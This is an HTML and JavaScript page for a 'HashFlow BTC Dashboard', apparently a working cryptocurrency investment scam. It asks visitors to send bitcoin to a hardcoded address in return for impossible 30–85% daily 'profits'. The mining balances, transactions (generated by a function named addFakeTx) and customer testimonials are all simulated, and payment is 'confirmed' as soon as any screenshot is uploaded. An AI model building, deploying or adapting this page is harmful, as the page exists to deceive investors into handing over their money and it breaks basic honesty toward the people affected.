<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HashFlow BTC Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;}
.card{max-width:95%;margin:15px auto;padding:20px;border-radius:12px;background:#131a2e;}
h2{color:#f2a900;text-align:center;margin-bottom:10px;}
.btc{font-size:28px;text-align:center;margin:10px 0;}
.stats{display:flex;justify-content:space-around;flex-wrap:wrap;}
.stats div{background:#0b0f1a;padding:10px;margin:5px;border-radius:8px;}
.tx-container{max-height:260px;overflow:hidden;background:#0b0f1a;padding:10px;border-radius:8px;font-size:13px;position:relative;}
.tx{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #222;}
.green{color:#00ff99;}
.yellow{color:#ffcc66;}
.btc-box{background:#0b0f1a;padding:10px;border-radius:8px;margin-top:10px;word-break:break-all;text-align:center;}
button{background:#f2a900;border:none;padding:10px 16px;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:5px;display:block;width:100%;}
input[type=file],input[type=text]{margin-top:10px;display:block;width:100%;padding:10px;border-radius:6px;border:none;font-size:14px;}
.countdown{color:#f2a900;font-weight:bold;margin-top:5px;}
.screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0f1a;display:block;}
.plan{border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;text-align:center;}
.plan h3{color:#f2a900;margin-bottom:10px;}
.plan p{margin:5px 0;}
.pay-section{display:none;margin-top:10px;}
#loginCard{max-width:400px;margin:50px auto;padding:20px;border-radius:12px;background:#131a2e;}
</style>
</head>
<body>

<!-- LOGIN -->
<div class="card" id="loginCard">
  <h2>Login</h2>
  <input type="text" id="emailInput" placeholder="Enter your email">
  <button id="loginBtn">Login</button>
</div>

<!-- DASHBOARD -->
<div id="dashboard" style="display:none;">

  <!-- BTC Deposit -->
  <div class="card">
    <h2>BTC Deposit Address</h2>
    <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
    <button onclick="copyAddress()">Copy Address</button>
    <div style="text-align:center;margin-top:10px;">
      <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
    </div>
  </div>

  <!-- Mining Dashboard -->
  <div class="card">
    <h2>Mining Dashboard</h2>
    <p style="text-align:center;color:#f2a900;">Earn 30% daily return</p>
    <div class="btc" id="balance">0.00000000 BTC</div>
    <canvas id="chart"></canvas>
    <div class="stats">
      <div>Hashrate: 120 TH/s</div>
      <div>Blocks: <span id="blocks">0</span></div>
      <div>Uptime: <span id="uptime">0h 0m</span></div>
    </div>
  </div>

  <!-- Recent Activity -->
  <div class="card">
    <h2>Recent Activity</h2>
    <div class="tx-container" id="txs"></div>
  </div>

  <!-- Investment Plans -->
  <h2>Investment Plans</h2>
  <div class="card" id="plansContainer"></div>

  <!-- Live Testimonials -->
  <div class="card">
    <h2>Live Testimonials</h2>
    <div class="tx-container" id="testimonials"></div>
  </div>

</div>

<script>
document.addEventListener("DOMContentLoaded", function() {
let currentEmail = localStorage.getItem("currentEmail") || "";

const plans = [
  {name:"Plan A", profit:"30%", min:200, max:599},
  {name:"Plan B", profit:"45%", min:600, max:1000},
  {name:"Plan C", profit:"60%", min:1100, max:2000},
  {name:"Plan D", profit:"75%", min:2000, max:4999},
  {name:"Plan E", profit:"80%", min:5000, max:9999},
  {name:"Plan F", profit:"85%", min:10000, max:"Unlimited"}
];

function showDashboard(){
  document.getElementById("loginCard").style.display = "none";
  document.getElementById("dashboard").style.display = "block";
  initPlans();
  initTestimonials();
}
if(currentEmail) showDashboard();
document.getElementById("loginBtn").onclick = function(){
  const email = document.getElementById("emailInput").value.trim().toLowerCase();
  if(!email){alert("Enter email"); return;}
  currentEmail = email;
  localStorage.setItem("currentEmail", currentEmail);
  showDashboard();
}

// ===== BTC Copy =====
function copyAddress(){
  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
    .then(()=>{alert('BTC address copied!');});
}

// ===== Global Mining =====
let balance = 0, blocks = 0, minutes = 0;
const txs = document.getElementById("txs");
let rate = 0.00000008, paused = false;

const canvas = document.getElementById("chart");
const ctx = canvas.getContext("2d");
let points = [0];
function drawChart(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  const w = canvas.width/50;
  ctx.beginPath();
  let lastY = canvas.height - points[0]*canvas.height/0.01;
  ctx.moveTo(0,lastY);
  for(let i=1;i<points.length;i++){
    let y = canvas.height - points[i]*canvas.height/0.01;
    ctx.lineTo(i*w,y);
  }
  ctx.strokeStyle="#f2a900";
  ctx.lineWidth=2;
  ctx.stroke();
  const last = points[points.length-1]||0;
  points.push(last+rate);
  if(points.length>50) points.shift();
}
setInterval(drawChart,500);

setInterval(()=>{
  blocks += Math.floor(Math.random()*2);
  minutes++;
  document.getElementById("blocks").innerText = blocks;
  document.getElementById("uptime").innerText = Math.floor(minutes/60)+"h "+(minutes%60)+"m";
},60000);

setInterval(()=>{
  if(!paused){ balance+=rate; document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";}
},1000);

function addFakeTx(){
  const div = document.createElement("div");
  div.className="tx";
  const val = (Math.random()*0.0004+0.00002).toFixed(8);
  const status = Math.random()>0.5?"Completed":"Pending";
  div.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
  txs.prepend(div);
  if(txs.children.length>500) txs.removeChild(txs.lastChild);
}
setInterval(addFakeTx,1500);

setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000);
setInterval(()=>{ balance*=0.995; },60*60*1000);

// ===== Investment Plans with mini live charts =====
function formatMoney(val){return typeof val==="number"?"$"+val:val;}
function initPlans(){
  const container = document.getElementById("plansContainer");
  container.innerHTML="";
  
  plans.forEach((plan,index)=>{
    const div = document.createElement("div");
    div.className="plan";
    div.id="plan"+index;
    div.innerHTML=`
      <h3>${plan.name}</h3>
      <p>Daily Profit: ${plan.profit}</p>
      <p>Minimum Investment: ${formatMoney(plan.min)}</p>
      <p>Maximum Investment: ${formatMoney(plan.max)}</p>
      <div class="pay-section" id="paySection${index}">
        <p>Send BTC to:</p>
        <div class="btc-box" id="planBtc${index}">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
        <button onclick="copyPlanAddress(${index})">Copy Address</button>
        <div style="text-align:center;margin-top:10px;">
          <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
        </div>
        <p>Upload screenshot of payment:</p>
        <input type="file" id="screenshot${index}" accept="image/*">
        <button id="paidBtn${index}">Paid</button>
        <img id="preview${index}" class="screenshot-img" style="display:none;">
        <p class="countdown" id="countdown${index}">Withdrawal available after 3 days of mining</p>
        <p class="btc" id="planBalance${index}">0.00000000 BTC</p>
        <canvas id="planChart${index}" style="width:100%;height:100px;margin-top:10px;background:#0b0f1a;border-radius:8px;"></canvas>
      </div>
      <button id="investBtn${index}">Invest Now</button>
    `;
    container.appendChild(div);

    const investBtn = document.getElementById("investBtn"+index);
    const paySection = document.getElementById("paySection"+index);
    const screenshotInput = document.getElementById("screenshot"+index);
    const preview = document.getElementById("preview"+index);
    const countdown = document.getElementById("countdown"+index);
    const paidBtn = document.getElementById("paidBtn"+index);
    const planBalance = document.getElementById("planBalance"+index);
    const planCanvas = document.getElementById("planChart"+index);
    const ctx = planCanvas.getContext("2d");

    let paymentConfirmed = false, startTime = null, investedAmount = 0, intervalId = null;
    let points = [0];

    if(currentEmail==="evilpaid666@gmail.com"){
      paymentConfirmed = localStorage.getItem("plan"+index+"_confirmed")==="true";
      startTime = paymentConfirmed ? parseInt(localStorage.getItem("plan"+index+"_start")) : null;
      investedAmount = paymentConfirmed ? parseFloat(localStorage.getItem("plan"+index+"_amount")) : 0;
      const savedImg = localStorage.getItem("plan"+index+"_screenshot");
      if(savedImg){ preview.src = savedImg; preview.style.display="block"; paySection.style.display="block"; investBtn.style.display="none"; }
    }

    function updateCountdown(){
      if(!paymentConfirmed){ countdown.innerText="Withdrawal available after 3 days of mining"; return; }
      const now = Date.now();
      const elapsed = now-startTime;
      const remaining = 3*24*60*60*1000 - elapsed;
      if(remaining<=0){ countdown.innerText="Withdrawal available now!"; } 
      else {
        const d=Math.floor(remaining/(1000*60*60*24)), h=Math.floor((remaining%(1000*60*60*24))/(1000*60*60));
        const m=Math.floor((remaining%(1000*60*60))/(1000*60)), s=Math.floor((remaining%(1000*60))/1000);
        countdown.innerText=`Withdrawal available in ${d}d ${h}h ${m}m ${s}s`;
      }
    }
    setInterval(updateCountdown,1000); updateCountdown();

    investBtn.onclick = ()=>{ paySection.style.display="block"; investBtn.style.display="none"; }

    function drawPlanChart(){
      ctx.clearRect(0,0,planCanvas.width,planCanvas.height);
      const w = planCanvas.width/50;
      ctx.beginPath();
      let lastY = planCanvas.height - points[0]*planCanvas.height/0.01;
      ctx.moveTo(0,lastY);
      for(let i=1;i<points.length;i++){
        let y = planCanvas.height - points[i]*planCanvas.height/0.01;
        ctx.lineTo(i*w,y);
      }
      ctx.strokeStyle="#f2a900";
      ctx.lineWidth=2;
      ctx.stroke();
    }

    function startMining(){
      if(intervalId) clearInterval(intervalId);
      const dailyPercent = parseFloat(plan.profit)/100;
      const ratePerSecond = investedAmount*dailyPercent/24/60/60;
      intervalId = setInterval(()=>{
        const newBalance = parseFloat(planBalance.innerText)+ratePerSecond;
        planBalance.innerText = newBalance.toFixed(8)+" BTC";
        points.push(newBalance); if(points.length>50) points.shift();
        drawPlanChart();
      },1000);
    }

    paidBtn.onclick = ()=>{
      const file = screenshotInput.files[0]; if(!file){alert("Please upload screenshot first."); return;}
      const reader = new FileReader();
      reader.onload = function(evt){
        investedAmount = prompt("Enter your investment amount:", plan.min);
        investedAmount = parseFloat(investedAmount);
        if(isNaN(investedAmount)||investedAmount<plan.min){ alert("Invalid amount!"); return; }
        if(currentEmail==="evilpaid666@gmail.com"){ preview.src=evt.target.result; preview.style.display="block";
          localStorage.setItem("plan"+index+"_screenshot",evt.target.result);
          localStorage.setItem("plan"+index+"_confirmed","true");
          localStorage.setItem("plan"+index+"_start",Date.now());
          localStorage.setItem("plan"+index+"_amount", investedAmount);
        }
        paymentConfirmed = true; startTime = Date.now(); startMining();
        alert(plan.name+" payment confirmed! Mining started. Withdrawal available in 3 days.");
      }
      reader.readAsDataURL(file);
    }
  });
}

// ===== Copy BTC address per plan =====
function copyPlanAddress(index){
  const addr=document.getElementById("planBtc"+index).innerText;
  navigator.clipboard.writeText(addr).then(()=>{alert("BTC address copied!");});
}

// ===== Live Testimonials =====
function initTestimonials(){
  const container = document.getElementById("testimonials");
  container.innerHTML="";
  const fullTestimonials = [
    {name:"Alice", msg:"Just started mining, love it!"},
    {name:"Bob", msg:"My first BTC deposit was smooth!"},
    {name:"Charlie", msg:"Mining dashboard looks real and professional."},
    {name:"Dana", msg:"I earned 0.002 BTC in just 2 hours!"},
    {name:"Eve", msg:"Highly recommend this platform."},
    {name:"Frank", msg:"Mining has never been easier."},
    {name:"Grace", msg:"I am seeing my BTC grow every minute."},
    {name:"Hannah", msg:"Customer support helped me quickly."},
    {name:"Ian", msg:"I love the live mining chart feature!"},
    {name:"Jack", msg:"Fast deposits and smooth withdrawals."},
    {name:"Kim", msg:"The dashboard feels very realistic."},
    {name:"Leo", msg:"I’ve earned more than I expected!"},
    {name:"Mia", msg:"Really enjoying the investment experience."},
    {name:"Nina", msg:"Everything looks so professional."},
    {name:"Oscar", msg:"I feel safe investing here."},
    {name:"Paul", msg:"I made my first BTC profit today!"},
    {name:"Quinn", msg:"The live activity makes it exciting."},
    {name:"Rachel", msg:"This dashboard feels real and alive."},
    {name:"Sam", msg:"I’m watching my investment grow!"},
    {name:"Tina", msg:"Love how the charts update in real time."}
  ];
  let usedTestimonials = JSON.parse(localStorage.getItem("usedTestimonials")) || [];
  let availableTestimonials = fullTestimonials.filter(t => !usedTestimonials.some(u => u.name===t.name && u.msg===t.msg));
  function addTestimonial(){
    if(availableTestimonials.length===0){
      availableTestimonials = fullTestimonials.filter(t => !usedTestimonials.some(u => u.name===t.name && u.msg===t.msg));
    }
    if(availableTestimonials.length===0) return;
    const index = Math.floor(Math.random()*availableTestimonials.length);
    const t = availableTestimonials.splice(index,1)[0];
    usedTestimonials.push(t);
    localStorage.setItem("usedTestimonials", JSON.stringify(usedTestimonials));
    const div = document.createElement("div");
    div.className="tx";
    div.innerHTML=`<span><strong>${t.name}:</strong> ${t.msg}</span>`;
    container.prepend(div);
    if(container.children.length>50) container.removeChild(container.lastChild);
  }
  setInterval(addTestimonial, 3000);
}
});
</script>
</body>
</html>
